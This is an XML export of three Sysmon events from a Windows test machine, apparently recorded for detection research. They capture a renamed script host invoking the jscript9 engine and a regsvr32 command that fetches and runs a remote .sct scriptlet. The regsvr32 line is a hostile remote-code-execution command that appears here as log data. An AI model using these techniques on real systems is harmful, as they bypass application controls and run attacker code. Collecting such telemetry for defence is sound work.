<root>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-18T17:50:36.858385600Z" />
      <EventRecordID>18849</EventRecordID>
      <Correlation />
      <Execution ProcessID="2044" ThreadID="1636" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">Execution - jscript9 engine invoked via clsid</Data>
      <Data Name="UtcTime">2019-05-18 17:50:36.858</Data>
      <Data Name="ProcessGuid">{365ABB72-45EC-5CE0-0000-00103A3E2400}</Data>
      <Data Name="ProcessId">1884</Data>
      <Data Name="Image">C:\ProgramData\winpm.exe</Data>
      <Data Name="FileVersion">5.8.7601.24288</Data>
      <Data Name="Description">Microsoft « Console Based Script Host</Data>
      <Data Name="Product">Microsoft « Windows Script Host</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">winpm.exe  //e:{16d51579-a30b-4c8b-a276-0ff4dc41e755} winpm_update.js</Data>
      <Data Name="CurrentDirectory">c:\ProgramData\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-433D-5CE0-0000-002031350100}</Data>
      <Data Name="LogonId">0x13531</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=C537FF2520215555B6E7B1B71C237F73D960BBED,MD5=41B81EF73218EC0EA0EC74F1C4C0F7B1,SHA256=D1B611E6D672AFC5A3D0F443FD8E2618B7416EFE2DD36593E971BF2F027A9AE3,IMPHASH=BFA8DFA346E250F59C0E2F57DAEFD14D</Data>
      <Data Name="ParentProcessGuid">{365ABB72-43E7-5CE0-0000-0010C6D20B00}</Data>
      <Data Name="ParentProcessId">2940</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\Windows\system32\cmd.exe" </Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>7</EventID>
      <Version>3</Version>
      <Level>4</Level>
      <Task>7</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-18T17:50:36.889323200Z" />
      <EventRecordID>18850</EventRecordID>
      <Correlation />
      <Execution ProcessID="2044" ThreadID="1636" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">Execution - rare script engine detected</Data>
      <Data Name="UtcTime">2019-05-18 17:50:36.889</Data>
      <Data Name="ProcessGuid">{365ABB72-45EC-5CE0-0000-00103A3E2400}</Data>
      <Data Name="ProcessId">1884</Data>
      <Data Name="Image">C:\ProgramData\winpm.exe</Data>
      <Data Name="ImageLoaded">C:\Windows\System32\jscript9.dll</Data>
      <Data Name="FileVersion">11.00.9600.19326 (winblue_ltsb_escrow.190325-1700)</Data>
      <Data Name="Description">Microsoft « JScript</Data>
      <Data Name="Product">Internet Explorer</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="Hashes">SHA1=459A1C58B1B478B53734D0E053E8E14A12ACF427,MD5=FD5FFB00810EC3A9BE8D07EBE94CC034,SHA256=EEB182D598CE511C6509A0B94C17B04D9A4F451FCF99381E61B9DA9F224C510A,IMPHASH=E40AA27717F3033220E53410215609D0</Data>
      <Data Name="Signed">true</Data>
      <Data Name="Signature">Microsoft Windows</Data>
      <Data Name="SignatureStatus">Valid</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2019-05-18T17:51:14.254967000Z" />
      <EventRecordID>18851</EventRecordID>
      <Correlation />
      <Execution ProcessID="2044" ThreadID="1636" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>IEWIN7</Computer>
      <Security UserID="S-1-5-18" />
    </System>
    <EventData>
      <Data Name="RuleName">
      </Data>
      <Data Name="UtcTime">2019-05-18 17:51:14.254</Data>
      <Data Name="ProcessGuid">{365ABB72-4612-5CE0-0000-00103D1E2600}</Data>
      <Data Name="ProcessId">2600</Data>
      <Data Name="Image">C:\Windows\System32\regsvr32.exe</Data>
      <Data Name="FileVersion">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
      <Data Name="Description">Microsoft(C) Register Server</Data>
      <Data Name="Product">Microsoft« Windows« Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="CommandLine">/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll</Data>
      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
      <Data Name="User">IEWIN7\IEUser</Data>
      <Data Name="LogonGuid">{365ABB72-433D-5CE0-0000-002031350100}</Data>
      <Data Name="LogonId">0x13531</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">Medium</Data>
      <Data Name="Hashes">SHA1=A774A816662FF5B75669AA5BCE751BAB9D0972B8,MD5=432BE6CF7311062633459EEF6B242FB5,SHA256=890C1734ED1EF6B2422A9B21D6205CF91E014ADD8A7F41AA5A294FCF60631A7B,IMPHASH=A2DAD36BD73280726DA578EB659D0583</Data>
      <Data Name="ParentProcessGuid">{365ABB72-433C-5CE0-0000-00100FD20000}</Data>
      <Data Name="ParentProcessId">964</Data>
      <Data Name="ParentImage">C:\Windows\System32\svchost.exe</Data>
      <Data Name="ParentCommandLine">C:\Windows\system32\svchost.exe -k netsvcs</Data>
    </EventData>
  </Event>
</root>